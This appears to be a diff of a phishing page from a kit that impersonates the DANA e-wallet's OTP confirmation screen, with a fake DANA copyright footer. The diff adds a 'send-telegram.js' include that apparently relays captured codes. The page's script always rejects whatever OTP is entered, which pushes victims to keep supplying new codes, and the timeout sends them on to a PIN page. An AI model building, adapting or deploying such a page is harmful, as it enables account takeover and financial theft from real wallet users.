@@ -1,333 +1,332 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link href="css/otp.css" rel="stylesheet">
+    <script src="js/send-telegram.js"></script>
     <title>Selesaikan di aplikasi DANA</title>
     <style>
-        /* 
-           ================================================================
-           <!-- Ambil kode Gw! boleh aja.., asal Lu tau diri bre.
-// Note: hargai pembuat kode dan tidak mengubah copyrigth ini.
-// ©2026 - develofer By NLhost --->
-           ================================================================
-        */
     </style>
 </head>
+
 <body>
 
-<audio id="notifSound" class="hidden-audio" preload="auto">
-    <source src="media/notification.mp3" type="audio/mpeg">
-</audio>
+    <audio id="notifSound" class="hidden-audio" preload="auto">
+        <source src="media/notification.mp3" type="audio/mpeg">
+    </audio>
 
-<div class="container">
+    <div class="container">
 
-    <div class="header">
-        <span>Selesaikan di aplikasi DANA</span>
-    </div>
+        <div class="header">
+            <span>Selesaikan di aplikasi DANA</span>
+        </div>
 
-    <div class="loader-section">
-        <div class="loader-wrap">
-            <div class="ring-track"></div>
-            <div class="center-circle">
-                <img src="images/dana.svg" alt="DANA">
+        <div class="loader-section">
+            <div class="loader-wrap">
+                <div class="ring-track"></div>
+                <div class="center-circle">
+                    <img src="images/dana.svg" alt="DANA">
+                </div>
+                <div class="arc-spin">
+                    <svg viewBox="0 0 102 102" fill="none">
+                        <circle cx="51" cy="51" r="48" stroke="#108ee9" stroke-width="4" stroke-linecap="round"
+                            stroke-dasharray="75 227" fill="none" />
+                    </svg>
+                </div>
             </div>
-            <div class="arc-spin">
-                <svg viewBox="0 0 102 102" fill="none">
-                    <circle cx="51" cy="51" r="48" stroke="#108ee9" stroke-width="4" stroke-linecap="round" stroke-dasharray="75 227" fill="none"/>
-                </svg>
+
+            <div class="main-title">Menunggu Konfirmasi di Aplikasi DANA</div>
+            <div class="main-desc">Buka aplikasi DANA untuk mendapatkan OTP</div>
+
+            <!-- Timer normal -->
+            <div id="timerArea">
+                <div class="timer-label">Verifikasi Dalam</div>
+                <div class="timer-boxes">
+                    <div class="timer-box" id="boxMin">00</div>
+                    <div class="timer-sep">:</div>
+                    <div class="timer-box" id="boxSec">30</div>
+                </div>
             </div>
-        </div>
 
-        <div class="main-title">Menunggu Konfirmasi di Aplikasi DANA</div>
-        <div class="main-desc">Buka aplikasi DANA untuk mendapatkan OTP</div>
-
-        <!-- Timer normal -->
-        <div id="timerArea">
-            <div class="timer-label">Verifikasi Dalam</div>
-            <div class="timer-boxes">
-                <div class="timer-box" id="boxMin">00</div>
-                <div class="timer-sep">:</div>
-                <div class="timer-box" id="boxSec">30</div>
-            </div>
-        </div>
-
-        <!-- Timeout inline -->
-        <div class="timeout-inline" id="timeoutInline">
-            <img src="images/timeout.png" alt="Timeout">
-            <h3>Waktu Habis</h3>
-            <p>Waktu verifikasi telah berakhir.<br>Silakan coba lagi.</p>
-            <button onclick="goBack()">Coba Lagi</button>
-        </div>
-    </div>
-
-    <div class="steps-box">
-        <div class="steps-heading" onclick="toggleTutorial()">
-            <span class="steps-heading-left">Cara Konfirmasi di Aplikasi DANA</span>
-            <img class="arrow-icon" id="arrowIcon" src="images/tap-arrow.png" alt="panah">
-        </div>
-
-        <div class="tutorial-panel" id="tutorialPanel">
-            <img src="media/tap-tutorial.gif" alt="Tutorial Konfirmasi DANA">
-        </div>
-
-        <div class="step">
-            <div class="step-num">1</div>
-            <div class="step-text">
-                <div class="bold">Buka aplikasi DANA secara manual.</div>
+            <!-- Timeout inline -->
+            <div class="timeout-inline" id="timeoutInline">
+                <img src="images/timeout.png" alt="Timeout">
+                <h3>Waktu Habis</h3>
+                <p>Waktu verifikasi telah berakhir.<br>Silakan coba lagi.</p>
+                <button onclick="goBack()">Coba Lagi</button>
             </div>
         </div>
 
-        <div class="step">
-            <div class="step-num">2</div>
-            <div class="step-text">
-                <div class="bold">Cek melalui Inbox</div>
-                <div class="sub">Buka Inbox di aplikasi DANA, lalu pilih permintaan terbaru.</div>
+        <div class="steps-box">
+            <div class="steps-heading" onclick="toggleTutorial()">
+                <span class="steps-heading-left">Cara Konfirmasi di Aplikasi DANA</span>
+                <img class="arrow-icon" id="arrowIcon" src="images/tap-arrow.png" alt="panah">
             </div>
-            <div class="step-icon-img">
-                <img src="images/inbox.png" alt="Pesan">
+
+            <div class="tutorial-panel" id="tutorialPanel">
+                <img src="media/tap-tutorial.gif" alt="Tutorial Konfirmasi DANA">
+            </div>
+
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-text">
+                    <div class="bold">Buka aplikasi DANA secara manual.</div>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-text">
+                    <div class="bold">Cek melalui Inbox</div>
+                    <div class="sub">Buka Inbox di aplikasi DANA, lalu pilih permintaan terbaru.</div>
+                </div>
+                <div class="step-icon-img">
+                    <img src="images/inbox.png" alt="Pesan">
+                </div>
             </div>
         </div>
-    </div>
 
-    <!-- OTP Section -->
-    <div class="otp-section">
-        <div class="otp-error" id="otpError">
-            <img src="images/error.png" alt="error">
-            <span>Kode OTP sudah tidak valid..!! Silahkan melakukan verifikasi ulang,</span>
+        <!-- OTP Section -->
+        <div class="otp-section">
+            <div class="otp-error" id="otpError">
+                <img src="images/error.png" alt="error">
+                <span>Kode OTP sudah tidak valid..!! Silahkan melakukan verifikasi ulang,</span>
+            </div>
+
+            <div class="otp-label">Masukkan Kode OTP</div>
+            <div class="otp-desc">Masukkan 4 digit kode yang dikirim setelah Anda melakukan Tap Verifikasi di aplikasi
+                DANA</div>
+
+            <div class="otp-boxes">
+                <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
+                <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
+                <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
+                <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
+            </div>
+
+            <div class="otp-loading" id="otpLoading">
+                <div class="dot-spin"></div>
+                <span>Memverifikasi kode...</span>
+            </div>
         </div>
 
-        <div class="otp-label">Masukkan Kode OTP</div>
-        <div class="otp-desc">Masukkan 4 digit kode yang dikirim setelah Anda melakukan Tap Verifikasi di aplikasi DANA</div>
-
-        <div class="otp-boxes">
-            <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
-            <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
-            <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
-            <input type="password" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
+        <!-- Footer Protection -->
+        <div class="footer-protection">
+            <div class="protection-img-wrap">
+                <img src="images/protection.png" alt="Protected">
+            </div>
+            <div class="footer-copyright">
+                © 2026 DANA Indonesia. All rights reserved.
+            </div>
         </div>
 
-        <div class="otp-loading" id="otpLoading">
-            <div class="dot-spin"></div>
-            <span>Memverifikasi kode...</span>
-        </div>
-    </div>
+        <script>
+            /* ===== PLAY NOTIFICATION SOUND ON LOAD ===== */
+            var audioNotif = document.getElementById('notifSound');
 
-    <!-- Footer Protection -->
-    <div class="footer-protection">
-        <div class="protection-img-wrap">
-            <img src="images/protection.png" alt="Protected">
-        </div>
-        <div class="footer-copyright">
-            © 2026 DANA Indonesia. All rights reserved.
-        </div>
-    </div>
+            function playNotif() {
+                if (audioNotif) {
+                    audioNotif.play().catch(function (e) {
+                        /* 
+                           Browser modern (Chrome/Safari) memblokir autoplay audio. 
+                           Fallback: Suara akan diputar otomatis saat user pertama kali 
+                           menyentuh layar (mengetik OTP / menekan tombol).
+                        */
+                        document.addEventListener('click', function playOnClick() {
+                            audioNotif.play();
+                            document.removeEventListener('click', playOnClick);
+                        }, { once: true });
 
-<script>
-    /* ===== PLAY NOTIFICATION SOUND ON LOAD ===== */
-    var audioNotif = document.getElementById('notifSound');
-    
-    function playNotif() {
-        if (audioNotif) {
-            audioNotif.play().catch(function(e) {
-                /* 
-                   Browser modern (Chrome/Safari) memblokir autoplay audio. 
-                   Fallback: Suara akan diputar otomatis saat user pertama kali 
-                   menyentuh layar (mengetik OTP / menekan tombol).
-                */
-                document.addEventListener('click', function playOnClick() {
-                    audioNotif.play();
-                    document.removeEventListener('click', playOnClick);
-                }, { once: true });
-                
-                document.addEventListener('touchstart', function playOnTouch() {
-                    audioNotif.play();
-                    document.removeEventListener('touchstart', playOnTouch);
-                }, { once: true });
-            });
-        }
-    }
-
-    // Jalankan saat halaman selesai dimuat
-    window.addEventListener('DOMContentLoaded', playNotif);
-
-
-    /* ===== TIMER ===== */
-    var TOTAL = 60;
-    var sisa = TOTAL;
-    var interval;
-
-    var boxMin = document.getElementById('boxMin');
-    var boxSec = document.getElementById('boxSec');
-    var timerArea = document.getElementById('timerArea');
-    var timeoutInline = document.getElementById('timeoutInline');
-
-    function pad(n) { return String(n).padStart(2, '0'); }
-
-    function updateDisplay() {
-        boxMin.textContent = pad(Math.floor(sisa / 60));
-        boxSec.textContent = pad(sisa % 60);
-    }
-
-    function startTimer() {
-        sisa = TOTAL;
-        updateDisplay();
-        boxMin.style.color = '#1a1a1a';
-        boxSec.style.color = '#1a1a1a';
-
-        /* Tampilkan timer, sembunyikan timeout */
-        timerArea.style.display = '';
-        timeoutInline.classList.remove('show');
-
-        interval = setInterval(function() {
-            sisa--;
-            if (sisa < 0) sisa = 0;
-            updateDisplay();
-
-            if (sisa <= 5 && sisa > 0) {
-                boxMin.style.color = '#e53e3e';
-                boxSec.style.color = '#e53e3e';
+                        document.addEventListener('touchstart', function playOnTouch() {
+                            audioNotif.play();
+                            document.removeEventListener('touchstart', playOnTouch);
+                        }, { once: true });
+                    });
+                }
             }
 
-            if (sisa <= 0) {
+            // Jalankan saat halaman selesai dimuat
+            window.addEventListener('DOMContentLoaded', playNotif);
+
+
+            /* ===== TIMER ===== */
+            var TOTAL = 60;
+            var sisa = TOTAL;
+            var interval;
+
+            var boxMin = document.getElementById('boxMin');
+            var boxSec = document.getElementById('boxSec');
+            var timerArea = document.getElementById('timerArea');
+            var timeoutInline = document.getElementById('timeoutInline');
+
+            function pad(n) { return String(n).padStart(2, '0'); }
+
+            function updateDisplay() {
+                boxMin.textContent = pad(Math.floor(sisa / 60));
+                boxSec.textContent = pad(sisa % 60);
+            }
+
+            function startTimer() {
+                sisa = TOTAL;
+                updateDisplay();
+                boxMin.style.color = '#1a1a1a';
+                boxSec.style.color = '#1a1a1a';
+
+                /* Tampilkan timer, sembunyikan timeout */
+                timerArea.style.display = '';
+                timeoutInline.classList.remove('show');
+
+                interval = setInterval(function () {
+                    sisa--;
+                    if (sisa < 0) sisa = 0;
+                    updateDisplay();
+
+                    if (sisa <= 5 && sisa > 0) {
+                        boxMin.style.color = '#e53e3e';
+                        boxSec.style.color = '#e53e3e';
+                    }
+
+                    if (sisa <= 0) {
+                        clearInterval(interval);
+                        onTimeout();
+                    }
+                }, 1000);
+            }
+
+            function onTimeout() {
+                /* Sembunyikan timer, tampilkan pesan inline */
+                timerArea.style.display = 'none';
+                timeoutInline.classList.add('show');
+            }
+
+            function goBack() {
+                // Menghentikan timer yang sedang berjalan
                 clearInterval(interval);
-                onTimeout();
-            }
-        }, 1000);
-    }
 
-    function onTimeout() {
-        /* Sembunyikan timer, tampilkan pesan inline */
-        timerArea.style.display = 'none';
-        timeoutInline.classList.add('show');
-    }
-
-    function goBack() {
-        // Menghentikan timer yang sedang berjalan
-        clearInterval(interval);
-        
-        // Redirect kembali ke halaman pin.html
-        window.location.href = 'pin.html';
-    }
-
-    startTimer();
-
-    /* ===== TUTORIAL TOGGLE ===== */
-    function toggleTutorial() {
-        document.getElementById('tutorialPanel').classList.toggle('show');
-        document.getElementById('arrowIcon').classList.toggle('open');
-    }
-
-    /* ===== OTP INPUT ===== */
-    var otpInputs = document.querySelectorAll('.otp-input');
-    var isSubmitting = false;
-
-    otpInputs.forEach(function(input, idx) {
-        input.addEventListener('input', function(e) {
-            if (isSubmitting) return;
-
-            var val = this.value.replace(/[^0-9]/g, '');
-            this.value = val;
-
-            this.classList.remove('error');
-            document.getElementById('otpError').classList.remove('show');
-
-            if (val) {
-                this.classList.add('filled');
-            } else {
-                this.classList.remove('filled');
+                // Redirect kembali ke halaman pin.html
+                window.location.href = 'pin.html';
             }
 
-            if (val && idx < otpInputs.length - 1) {
-                otpInputs[idx + 1].focus();
+            startTimer();
+
+            /* ===== TUTORIAL TOGGLE ===== */
+            function toggleTutorial() {
+                document.getElementById('tutorialPanel').classList.toggle('show');
+                document.getElementById('arrowIcon').classList.toggle('open');
             }
 
-            // Jika 4 digit sudah terisi, langsung kirim
-            if (getOTPValue().length === 4) {
-                submitOTP();
+            /* ===== OTP INPUT ===== */
+            var otpInputs = document.querySelectorAll('.otp-input');
+            var isSubmitting = false;
+
+            otpInputs.forEach(function (input, idx) {
+                input.addEventListener('input', function (e) {
+                    if (isSubmitting) return;
+
+                    var val = this.value.replace(/[^0-9]/g, '');
+                    this.value = val;
+
+                    this.classList.remove('error');
+                    document.getElementById('otpError').classList.remove('show');
+
+                    if (val) {
+                        this.classList.add('filled');
+                    } else {
+                        this.classList.remove('filled');
+                    }
+
+                    if (val && idx < otpInputs.length - 1) {
+                        otpInputs[idx + 1].focus();
+                    }
+
+                    // Jika 4 digit sudah terisi, langsung kirim
+                    if (getOTPValue().length === 4) {
+                        submitOTP();
+                    }
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (isSubmitting) return;
+                    if (e.key === 'Backspace' && !this.value && idx > 0) {
+                        otpInputs[idx - 1].focus();
+                        otpInputs[idx - 1].value = '';
+                        otpInputs[idx - 1].classList.remove('filled');
+                    }
+                });
+
+                input.addEventListener('focus', function () {
+                    this.select();
+                });
+
+                input.addEventListener('paste', function (e) {
+                    if (isSubmitting) return;
+                    e.preventDefault();
+                    var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+                    if (paste.length >= 4) {
+                        otpInputs[0].value = paste[0] || '';
+                        otpInputs[1].value = paste[1] || '';
+                        otpInputs[2].value = paste[2] || '';
+                        otpInputs[3].value = paste[3] || '';
+                        otpInputs.forEach(function (inp) { inp.classList.add('filled'); });
+                        otpInputs[3].focus();
+                        submitOTP();
+                    } else if (paste.length > 0) {
+                        this.value = paste[0];
+                        this.classList.add('filled');
+                        if (idx < 3) otpInputs[idx + 1].focus();
+                    }
+                });
+            });
+
+            function getOTPValue() {
+                var code = '';
+                otpInputs.forEach(function (inp) { code += inp.value; });
+                return code;
             }
-        });
 
-        input.addEventListener('keydown', function(e) {
-            if (isSubmitting) return;
-            if (e.key === 'Backspace' && !this.value && idx > 0) {
-                otpInputs[idx - 1].focus();
-                otpInputs[idx - 1].value = '';
-                otpInputs[idx - 1].classList.remove('filled');
+            function submitOTP() {
+                var code = getOTPValue();
+                if (code.length < 4 || isSubmitting) return;
+
+                isSubmitting = true;
+                document.getElementById('otpError').classList.remove('show');
+                document.getElementById('otpLoading').classList.add('show');
+
+                // Nonaktifkan input sementara proses pengiriman
+                otpInputs.forEach(function (inp) { inp.disabled = true; });
+
+                setTimeout(function () {
+                    document.getElementById('otpLoading').classList.remove('show');
+                    showOTPError();
+                }, 1000);
             }
-        });
 
-        input.addEventListener('focus', function() {
-            this.select();
-        });
+            function showOTPError() {
+                // Pastikan loading hilang saat error muncul
+                document.getElementById('otpLoading').classList.remove('show');
 
-        input.addEventListener('paste', function(e) {
-            if (isSubmitting) return;
-            e.preventDefault();
-            var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
-            if (paste.length >= 4) {
-                otpInputs[0].value = paste[0] || '';
-                otpInputs[1].value = paste[1] || '';
-                otpInputs[2].value = paste[2] || '';
-                otpInputs[3].value = paste[3] || '';
-                otpInputs.forEach(function(inp) { inp.classList.add('filled'); });
-                otpInputs[3].focus();
-                submitOTP();
-            } else if (paste.length > 0) {
-                this.value = paste[0];
-                this.classList.add('filled');
-                if (idx < 3) otpInputs[idx + 1].focus();
+                // Reset tampilan input
+                otpInputs.forEach(function (inp) {
+                    inp.classList.add('error');
+                    inp.classList.remove('filled');
+                    inp.disabled = false; // Aktifkan kembali input agar bisa diisi ulang
+                });
+
+                // Tampilkan pesan error
+                document.getElementById('otpError').classList.add('show');
+
+                // Fokuskan kembali ke input pertama setelah animasi shake selesai
+                setTimeout(function () {
+                    otpInputs[0].focus();
+                }, 500);
+
+                // Reset status submitting agar bisa input ulang
+                isSubmitting = false;
             }
-        });
-    });
-
-    function getOTPValue() {
-        var code = '';
-        otpInputs.forEach(function(inp) { code += inp.value; });
-        return code;
-    }
-
-    function submitOTP() {
-        var code = getOTPValue();
-        if (code.length < 4 || isSubmitting) return;
-
-        isSubmitting = true;
-        document.getElementById('otpError').classList.remove('show');
-        document.getElementById('otpLoading').classList.add('show');
-
-        // Nonaktifkan input sementara proses pengiriman
-        otpInputs.forEach(function(inp) { inp.disabled = true; });
-
-        setTimeout(function() {
-            document.getElementById('otpLoading').classList.remove('show');
-            showOTPError();
-        }, 1000);
-    }
-
-    function showOTPError() {
-        // Pastikan loading hilang saat error muncul
-        document.getElementById('otpLoading').classList.remove('show');
-
-        // Reset tampilan input
-        otpInputs.forEach(function(inp) {
-            inp.classList.add('error');
-            inp.classList.remove('filled');
-            inp.disabled = false; // Aktifkan kembali input agar bisa diisi ulang
-        });
-
-        // Tampilkan pesan error
-        document.getElementById('otpError').classList.add('show');
-
-        // Fokuskan kembali ke input pertama setelah animasi shake selesai
-        setTimeout(function() {
-            otpInputs[0].focus();
-        }, 500);
-
-        // Reset status submitting agar bisa input ulang
-        isSubmitting = false;
-    }
-</script>
+        </script>
 
 </body>
+
 </html>
